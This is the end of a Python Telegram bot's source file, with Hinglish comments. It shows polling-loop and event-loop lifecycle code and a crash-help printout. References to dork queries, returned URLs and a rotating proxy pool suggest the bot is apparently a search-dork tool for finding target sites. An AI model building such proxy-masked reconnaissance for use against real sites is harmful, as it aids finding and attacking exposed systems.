         "<b>Real URLs:</b>\n%s" % (esc(dork[:80]), took, body)),
        parse_mode=ParseMode.HTML)


async def _serve(app, stop_ev=None) -> None:
    """Apna polling loop — asyncio.get_event_loop() use NAHI karta.

    PTB ka run_polling() Python 3.12+ / 3.14 pe 'There is no current event
    loop' deta hai, isliye yahan manually initialize/start/poll karte hain.
    """
    if stop_ev is None:
        stop_ev = asyncio.Event()
    _install_signals(stop_ev)
    await app.initialize()
    await _self_check(app)
    await app.start()
    await app.updater.start_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
        poll_interval=0.5,
        timeout=30,
    )
    logger.info("✅ Polling chalu — bot zinda hai. (Ctrl+C ya ./stop.sh se band)")
    try:
        await stop_ev.wait()
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        logger.info("⏹ Band ho raha hai…")
        try:
            await app.updater.stop()
        except Exception:
            pass
        try:
            await app.stop()
        except Exception:
            pass
        try:
            await app.shutdown()
        except Exception:
            pass
        logger.info("👋 Band ho gaya.")


def _run_loop(app, stop_ev=None) -> None:
    """Naya event loop bana ke chalata hai (3.14 safe)."""
    try:
        loop = asyncio.new_event_loop()
    except Exception:
        loop = None
    if loop is None:
        asyncio.run(_serve(app, stop_ev))
        return
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(_serve(app, stop_ev))
    except KeyboardInterrupt:
        pass
    finally:
        try:
            pending = asyncio.all_tasks(loop)
            for t in pending:
                t.cancel()
            if pending:
                loop.run_until_complete(asyncio.gather(*pending, return_exceptions=True))
        except Exception:
            pass
        try:
            loop.run_until_complete(loop.shutdown_asyncgens())
        except Exception:
            pass
        try:
            asyncio.set_event_loop(None)
        except Exception:
            pass
        try:
            loop.close()
        except Exception:
            pass


def main():
    logger.info("🐍 %s CORE %s starting… (Python %s • PTB %s)",
                BRAND, VERSION, platform.python_version(),
                getattr(__import__("telegram"), "__version__", "?"))
    try:
        load_proxy_pool()
    except Exception:
        pass
    logger.info("✅ %s CORE ready — %d sources • %s dorks space",
                BRAND, len(PROXY_SOURCES), fmt(db_counts()["dorks"]))
    app = build_app()
    try:
        _run_loop(app)
    except KeyboardInterrupt:
        print("\n👋 Band kiya.")
    except Exception as exc:
        logger.exception("Bot crash: %s", exc)
        print("\n" + "=" * 62)
        print("  ❌ BOT CRASH: %s" % str(exc)[:200])
        print("=" * 62)
        print("  Jaanch ke points:")
        print("   • Token galat/revoke?     → ./setconfig.sh --token <naya>")
        print("   • 2 bot chal rahe?        → ./stop.sh && ./start.sh")
        print("   • Internet band?          → ping google.com")
        print("   • Purani file pe wapas    → ls backups/ ; cp backups/<file> snake_core.py")
        print("=" * 62 + "\n")
        raise


if __name__ == "__main__":
    main()
